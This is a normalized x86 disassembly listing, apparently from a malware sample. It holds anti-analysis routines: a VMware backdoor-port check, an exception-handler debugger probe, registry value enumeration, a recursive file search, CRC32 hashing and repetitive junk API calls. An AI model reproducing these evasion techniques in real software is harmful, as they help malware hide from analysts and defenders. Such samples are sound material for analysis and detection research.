mov al [ ebp - 0x6 ]
mov cl al
shr cl 0x2
shl al 0x6
add al [ ebp - 0x5 ]
and cl 0xf
shl dl 0x4
xor cl dl
mov [ ebp - 0x3 ] cl
mov [ ebp - 0x2 ] al
xor esi esi
movzx eax [ ebp + edi - 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x19 ]
push eax
call sub_40f6ee
lea ecx [ ebp - 0x19 ]
call sub_40f609
inc edi
cmp edi esi
jl r-xdata
movzx eax [ ebp + esi - 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x19 ]
push eax
call sub_40f6ee
lea ecx [ ebp - 0x19 ]
call sub_40f609
inc esi
cmp esi 0x3
jl r-xdata
xor esi esi
sub_40ab31
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
push 0x20
call sub_411160
push 0x20
xor ebx ebx
push ebx
push eax
mov [ ebp - 0x8 ] eax
call sub_41112d
mov eax [ ebp + 0xc ]
add esp 0x10
xor edi edi
cmp eax ebx
jle r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop ebx
leave
retn
push esi
mov [ ebp - 0x4 ] eax
mov esi 0x400
push eax
mov eax [ ebp + 0x8 ]
add eax ebx
push eax
call sub_40ae78
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
xor [ ecx + edi * 4 ] eax
inc edi
cmp edi 0x8
jne r-xdata
mov eax esi
sub [ ebp - 0x4 ] esi
add ebx esi
cmp ebx [ ebp + 0xc ]
jl r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
cmp eax esi
jl r-xdata
pop esi
sub_40ab99
push esi
mov esi [ rw-data ]
push edi
xor edi edi
inc edi
jmp r-xdata
test esi esi
jne r-xdata
push 0x20
push [ esp + 0x10 ]
push esi
call sub_411095
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
xor edi edi
mov esi [ esi + 0x20 ]
mov eax edi
pop edi
pop esi
retn
sub_40abc9
push ebp
mov ebp esp
sub esp 0xc
push 0x24
call sub_411160
test eax eax
pop ecx
je r-xdata
xor eax eax
and [ eax + 0x20 ] 0x0
jmp r-xdata
xor eax eax
pop esi
leave
retn
push 0x20
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push esi
push 0x80000001
call sub_40c0bc
add esp 0x14
mov ecx [ rw-data ]
push esi
mov [ ecx + 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
push 0x20
push [ ebp + 0x8 ]
mov [ rw-data ] eax
push eax
call sub_4110cf
mov eax [ rw-data ]
inc [ rw-data ]
push eax
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_4115cd
push 0x20
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
mov esi r--data
push esi
push 0x80000002
call sub_40c0bc
add esp 0x2c
test eax eax
jne r-xdata
sub_40ac5b
push ebp
mov ebp esp
sub esp 0x270
push ebx
push 0x24
call sub_411160
xor ebx ebx
cmp eax ebx
pop ecx
je r-xdata
xor eax eax
mov [ eax + 0x20 ] ebx
jmp r-xdata
pop ebx
leave
retn
push 0x103
lea eax [ ebp - 0x26f ]
push ebx
push eax
mov [ ebp - 0x270 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x270 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x104
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] 0x12c
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] eax
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x80000001
mov [ rw-data ] 0x1
mov [ ebp - 0x4 ] ebx
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x10 ] ebx
jbe r-xdata
push esi
mov esi [ RegQueryValueExA@IAT ]
push edi
mov edi 0xea
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
mov eax 0x2000
push eax
push 0x40
mov [ ebp - 0x8 ] eax
call [ GlobalAlloc@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x16c ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x18 ] 0x12c
push [ ebp - 0x4 ]
mov [ ebp - 0x16c ] bl
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
lea ecx [ ebp - 0x8 ]
push ecx
push eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x16c ]
push eax
push [ ebp - 0x4 ]
call esi
cmp eax edi
je r-xdata
add [ ebp - 0x8 ] 0x400
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_4114aa
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push [ ebp - 0xc ]
call [ GlobalFree@IAT ]
push 0x24
call sub_411160
cmp eax ebx
pop ecx
je r-xdata
xor eax eax
mov [ eax + 0x20 ] ebx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ecx + 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
push 0x20
push [ ebp - 0xc ]
mov [ rw-data ] eax
push eax
call sub_4110cf
add esp 0xc
inc [ rw-data ]
sub_40ae08
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi 0x12c
push esi
call sub_411160
pop ecx
mov ebx eax
push esi
push ebx
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
mov [ ebp - 0x10 ] 0x5c3a43
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosw [ edi ]
mov al [ ebx ]
push 0xa
mov [ ebp - 0x10 ] al
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ GetVolumeInformationA@IAT ]
push ebx
call sub_410a7a
lea eax [ ebp - 0x1c ]
mov [ esp ] r--data
push eax
call sub_411692
pop ecx
pop ecx
neg eax
pop edi
sbb al al
pop esi
inc al
pop ebx
leave
retn
sub_40ae78
push ebp
mov ebp esp
sub esp 0x400
and [ ebp - 0x400 ] 0x0
push 0x3fc
lea eax [ ebp - 0x3fc ]
push 0x0
push eax
call sub_41112d
add esp 0xc
xor ecx ecx
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
mov [ ebp + ecx * 4 - 0x400 ] eax
inc ecx
cmp ecx 0x100
jb r-xdata
dec edx
test edx edx
jg r-xdata
push 0x8
mov eax ecx
pop edx
push esi
mov esi [ ebp + 0xc ]
or eax 0xffffffff
test esi esi
jbe r-xdata
not eax
pop esi
leave
retn
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
xor edx eax
and edx 0xff
shr eax 0x8
xor eax [ ebp + edx * 4 - 0x400 ]
inc ecx
dec esi
jne r-xdata
sub_40aef5
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
xor eax eax
inc eax
je r-xdata
xor eax eax
je r-xdata
call sub_40f095
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] esp
mov [ ebp - 0x1c ] ebp
lea eax [ ebp - 0x20 ]
push eax
call sub_40f06f
pop ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] sub_40f09c
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push ebx
mov ebx 0x0
mov eax 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
jmp r-xdata
pusha
popa
mov [ ebp - 0x1 ] 0x0
sub_40af8a
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
xor eax eax
inc eax
je r-xdata
xor eax eax
je r-xdata
call sub_40f095
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] esp
mov [ ebp - 0x1c ] ebp
lea eax [ ebp - 0x20 ]
push eax
call sub_40f06f
pop ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] sub_40f09c
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push edx
push ecx
push ebx
mov eax 0x564d5868
mov ebx 0x0
mov ecx 0xa
mov edx 0x5658
in eax dx
cmp ebx 0x564d5868
sete [ ebp - 0x1 ]
pop ebx
pop ecx
pop edx
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
jmp r-xdata
pusha
popa
mov [ ebp - 0x1 ] 0x0
sub_40b02e
xor eax eax
cmp [ rw-data ] eax
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov al 0x1
retn
xor eax eax
cmp [ rw-data ] 0x1
sete al
retn
cmp [ rw-data ] eax
mov [ rw-data ] 0x2
jne r-xdata
mov [ rw-data ] 0x1
call sub_40af8a
test al al
jne r-xdata
call sub_40aef5
test al al
je r-xdata
sub_40b07e
push ebp
mov ebp esp
sub esp 0xd64
push esi
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x964 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x964 ]
push r--data
push eax
call sub_411657
add esp 0x10
cmp [ rw-data ] 0x0
mov esi 0x400
jne r-xdata
cmp [ rw-data ] 0x0
mov edi rw-data
jne r-xdata
push esi
push rw-data
call [ GetWindowsDirectoryA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0xd64 ]
push eax
call sub_4116d8
and [ ebp - 0x4 ] 0x0
pop ecx
mov eax r--data
pop ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x14 ] r--data
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] r--data
mov [ ebp - 0x8 ] r--data
xor esi esi
push esi
push edi
push r--data
call [ GetEnvironmentVariableA@IAT ]
pop edi
pop esi
leave
retn
mov eax [ ebp + esi * 4 - 0x20 ]
inc esi
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x564 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x564 ]
push eax
call sub_411747
add esp 0xc
push eax
lea eax [ ebp - 0xd64 ]
push eax
call sub_411747
pop ecx
push eax
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
push edi
call sub_411747
push eax
push [ ebp + 0x8 ]
call sub_41188f
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_411747
push eax
push [ ebp + 0x8 ]
call sub_41188f
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x164 ]
push eax
lea eax [ ebp - 0x964 ]
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
call [ FindClose@IAT ]
push 0x1
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x564 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x564 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x138 ]
push eax
lea eax [ ebp - 0x564 ]
push eax
call sub_411657
add esp 0x18
test [ ebp - 0x164 ] 0x10
je r-xdata
lea eax [ ebp - 0x164 ]
push eax
lea eax [ ebp - 0x564 ]
push eax
call [ ebp + 0xc ]
lea eax [ ebp - 0x138 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x164 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x138 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x564 ]
push eax
call sub_40b07e
jmp r-xdata
pop ecx
pop ecx
sub_40b285
push esi
mov esi [ esp + 0xc ]
or [ esi ] 0xffffffff
push edi
xor edi edi
push edi
push edi
push 0x3
push edi
push 0x3
push 0x80000000
push [ esp + 0x24 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
push edi
push eax
call [ GetFileSize@IAT ]
push edi
push edi
push edi
push 0x2
push edi
push [ esi ]
mov [ esi + 0xc ] eax
call [ CreateFileMappingA@IAT ]
push edi
push edi
push edi
push 0x4
push eax
mov [ esi + 0x4 ] eax
call [ MapViewOfFile@IAT ]
mov [ esi + 0x8 ] eax
xor eax eax
cmp [ esi ] 0xffffffff
setne al
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40b2e7
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0xffffffff
je r-xdata
xor eax eax
pop esi
retn
push edi
push [ esi + 0x8 ]
call [ UnmapViewOfFile@IAT ]
push [ esi + 0x4 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ esi ]
call edi
pop edi
sub_40b318
push ebp
mov ebp esp
sub esp 0x94
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
call sub_4023b8
push r--data
push [ ebp + 0x8 ]
call sub_410c4c
mov esi eax
test esi esi
pop ecx
pop ecx
mov [ ebp - 0x1c ] esi
jne r-xdata
push esi
xor ebx ebx
inc ebx
push ebx
lea eax [ ebp - 0x94 ]
push 0x4c
push eax
call sub_410d0d
add esp 0x10
cmp eax ebx
jne r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x1c ]
call sub_410b53
pop ecx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x15 ]
push [ ebp + 0x8 ]
call sub_40f4c7
mov ecx eax
call sub_40f7cb
lea ecx [ ebp - 0x15 ]
mov bl al
call sub_40f609
test bl bl
je r-xdata
push 0x4
lea eax [ ebp - 0x94 ]
push r--data
push eax
call sub_411095
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov al [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x80 ]
test bl al
je r-xdata
mov ecx [ ebp - 0x7c ]
shr ecx 0x4
test bl cl
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_410d0d
add esp 0x10
cmp eax ebx
jne r-xdata
shr eax 0x1
test bl al
je r-xdata
push esi
call sub_410b53
pop ecx
jmp r-xdata
movsx eax [ ebp - 0x8 ]
push ebx
push eax
push esi
call sub_410e24
add esp 0xc
test eax eax
je r-xdata
push esi
push ebx
lea eax [ ebp - 0x48 ]
push 0x1c
push eax
call sub_410d0d
add esp 0x10
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ ebp - 0x48 ]
cmp eax 0x1c
jb r-xdata
cmp eax 0x1000
jge r-xdata
lea edi [ eax - 0x1c ]
lea eax [ edi + 0x10 ]
push eax
call sub_411160
mov esi eax
test esi esi
pop ecx
je r-xdata
push [ ebp - 0x1c ]
push ebx
push edi
push esi
call sub_410d0d
add esp 0x10
cmp eax ebx
jne r-xdata
push esi
call sub_410a7a
pop ecx
mov eax [ ebp - 0x30 ]
lea edi [ eax + esi - 0x1c ]
mov al [ ebp - 0x40 ]
not al
test bl al
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax + esi - 0x1c ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0xc ]
lea eax [ eax + esi - 0x8 ]
push eax
lea eax [ ebp - 0x29 ]
push eax
call sub_40f785
lea ecx [ ebp - 0x29 ]
call sub_40f609
mov ecx [ ebp + 0xc ]
sub esp 0x10
mov eax esp
push edi
push eax
push r--data
lea eax [ ebp - 0x15 ]
push eax
call sub_40f74e
mov ecx eax
call sub_40f74e
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x29 ]
push eax
call sub_40f80b
lea ecx [ ebp - 0x29 ]
call sub_40f609
cmp [ edi ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x15 ]
push eax
call sub_40f785
lea ecx [ ebp - 0x15 ]
call sub_40f609
call sub_40f609
mov [ ebp - 0x1 ] bl
mov ecx [ ebp + 0xc ]
sub esp 0x10
cmp [ ecx + 0x8 ] 0x0
mov eax esp
push edi
push eax
jne r-xdata
push r--data
lea eax [ ebp - 0x29 ]
push eax
call sub_40f74e
mov ecx eax
call sub_40f74e
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x15 ]
push eax
call sub_40f80b
lea ecx [ ebp - 0x15 ]
call sub_40f609
lea ecx [ ebp - 0x29 ]
call sub_40f74e
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x15 ]
push eax
call sub_40f80b
jmp r-xdata
lea ecx [ ebp - 0x15 ]
jmp r-xdata
sub_40b559
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
call esi
mov edi 0x3e8
push edi
call sub_411160
mov ebp [ GetTempPathA@IAT ]
pop ecx
mov ebx eax
push ebx
push edi
call ebp
push 0x543
call sub_411160
pop ecx
push eax
push 0x1
push 0x0
push ebx
mov [ esp + 0x20 ] eax
call [ GetTempFileNameA@IAT ]
push r--data
push [ esp + 0x14 ]
call sub_411657
push ebx
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push 0x32
call esi
mov ebx 0x1f4
push ebx
call sub_411160
pop ecx
push ebx
push eax
push 0x0
mov [ esp + 0x20 ] eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
mov eax [ esp + 0x14 ]
push eax
mov [ eax + 0x5 ] 0x61
call sub_410a7a
pop ecx
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x18 ] eax
call ebp
push 0x575
call sub_411160
pop ecx
push eax
push 0x2
push 0x0
push [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
call [ GetTempFileNameA@IAT ]
push r--data
push [ esp + 0x18 ]
call sub_411657
push [ esp + 0x18 ]
call sub_410a7a
push [ esp + 0x20 ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebp
push 0x54e
call sub_411160
pop ecx
push eax
push 0x3
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call [ GetTempFileNameA@IAT ]
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push ebx
call sub_411160
pop ecx
push ebx
push eax
push 0x0
mov [ esp + 0x20 ] eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
mov eax [ esp + 0x14 ]
push eax
mov [ eax + 0xa ] 0x74
call sub_410a7a
pop ecx
push 0x32
call esi
push 0x32
call esi
mov ebx [ GetCurrentProcess@IAT ]
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push 0x32
call esi
push 0x32
call esi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push edi
call sub_411160
pop ecx
mov ebx eax
push ebx
push edi
call ebp
push 0x552
call sub_411160
pop ecx
mov edi eax
push edi
push 0x4
push 0x0
push ebx
call [ GetTempFileNameA@IAT ]
push r--data
push edi
call sub_411657
push ebx
call sub_410a7a
push edi
call sub_410a7a
add esp 0x10
push 0x32
call esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
sub_40b79a
push ecx
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
call esi
push 0x32
call esi
mov edi 0x1f4
push edi
call sub_411160
mov ebx [ GetModuleHandleA@IAT ]
pop ecx
push edi
push eax
push 0x0
mov [ esp + 0x1c ] eax
call ebx
mov ebp [ GetModuleFileNameA@IAT ]
push eax
call ebp
mov eax [ esp + 0x10 ]
push eax
mov [ eax + 0x9 ] 0x74
call sub_410a7a
pop ecx
push 0x32
call esi
push edi
call sub_411160
pop ecx
push edi
push eax
push 0x0
mov [ esp + 0x1c ] eax
call ebx
push eax
call ebp
mov eax [ esp + 0x10 ]
push eax
mov [ eax + 0x3 ] 0x74
call sub_410a7a
pop ecx
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push edi
push eax
push 0x0
mov [ esp + 0x1c ] eax
call ebx
push eax
call ebp
mov eax [ esp + 0x10 ]
push eax
mov [ eax + 0xb ] 0x61
call sub_410a7a
pop ecx
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push edi
push eax
push 0x0
mov [ esp + 0x1c ] eax
call ebx
push eax
call ebp
mov eax [ esp + 0x10 ]
push eax
mov [ eax + 0x8 ] 0x61
call sub_410a7a
pop ecx
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push edi
push eax
push 0x0
mov [ esp + 0x1c ] eax
call ebx
push eax
call ebp
mov eax [ esp + 0x10 ]
push eax
mov [ eax + 0xa ] 0x74
call sub_410a7a
pop ecx
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push 0x32
call esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
sub_40b8bd
push ecx
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ Sleep@IAT ]
push 0x32
pop ebp
push ebp
call edi
push ebp
call edi
mov esi [ GetCurrentProcess@IAT ]
call esi
mov ebx [ OpenProcessToken@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call ebx
test eax eax
je r-xdata
push ebp
call edi
call esi
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call ebx
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push ebp
call edi
mov esi 0x3e8
push esi
call sub_411160
mov ebx [ GetTempPathA@IAT ]
pop ecx
mov ebp eax
push ebp
push esi
mov [ esp + 0x1c ] ebp
call ebx
push 0x54f
call sub_411160
pop ecx
push eax
push 0x5
push 0x0
push ebp
mov ebp [ GetTempFileNameA@IAT ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call edi
push esi
call sub_411160
pop ecx
push eax
push esi
mov [ esp + 0x18 ] eax
call ebx
push 0x56e
call sub_411160
pop ecx
push eax
push 0x6
push 0x0
push [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
call ebp
push r--data
push [ esp + 0x18 ]
call sub_411657
push [ esp + 0x18 ]
call sub_410a7a
push [ esp + 0x20 ]
call sub_410a7a
add esp 0x10
push 0x32
call edi
push 0x32
call edi
push 0x32
call edi
push 0x1f4
call sub_411160
mov [ esp ] 0x1f4
push eax
push 0x0
mov [ esp + 0x20 ] eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
mov eax [ esp + 0x14 ]
push eax
mov [ eax + 0x2 ] 0x74
call sub_410a7a
push esi
call sub_411160
pop ecx
pop ecx
mov [ esp + 0x14 ] eax
push eax
push esi
call ebx
push 0x54c
call sub_411160
pop ecx
push eax
push 0x7
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call edi
push 0x32
call edi
push esi
call sub_411160
pop ecx
push eax
push esi
mov [ esp + 0x1c ] eax
call ebx
push 0x519
call sub_411160
pop ecx
push eax
push 0x8
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call edi
push 0x32
call edi
push esi
call sub_411160
pop ecx
push eax
push esi
mov [ esp + 0x1c ] eax
call ebx
push 0x55a
call sub_411160
pop ecx
push eax
push 0x9
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call edi
push esi
call sub_411160
pop ecx
mov [ esp + 0x14 ] eax
push eax
push esi
call ebx
push 0x55a
call sub_411160
pop ecx
push eax
push 0xa
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call edi
push 0x32
call edi
push esi
call sub_411160
pop ecx
push eax
push esi
mov [ esp + 0x1c ] eax
call ebx
push 0x522
call sub_411160
pop ecx
mov esi eax
push esi
push 0xb
push 0x0
push [ esp + 0x20 ]
call ebp
push r--data
push esi
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push esi
call sub_410a7a
add esp 0x10
push 0x32
call edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
sub_40bb9f
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov edi 0x3e8
push edi
call sub_411160
mov ebx [ GetTempPathA@IAT ]
pop ecx
mov ebp eax
push ebp
push edi
mov [ esp + 0x1c ] ebp
call ebx
push 0x539
call sub_411160
pop ecx
push eax
push 0xb
push 0x0
push ebp
mov ebp [ GetTempFileNameA@IAT ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x18 ] eax
call ebx
push 0x55c
call sub_411160
pop ecx
push eax
push 0xc
push 0x0
push [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
call ebp
push r--data
push [ esp + 0x18 ]
call sub_411657
push [ esp + 0x18 ]
call sub_410a7a
push [ esp + 0x20 ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebx
push 0x556
call sub_411160
pop ecx
push eax
push 0xd
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push 0x32
call esi
push 0x1f4
call sub_411160
mov [ esp ] 0x1f4
push eax
push 0x0
mov [ esp + 0x20 ] eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
mov eax [ esp + 0x14 ]
push eax
mov [ eax + 0x5 ] 0x61
call sub_410a7a
pop ecx
push 0x32
call esi
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
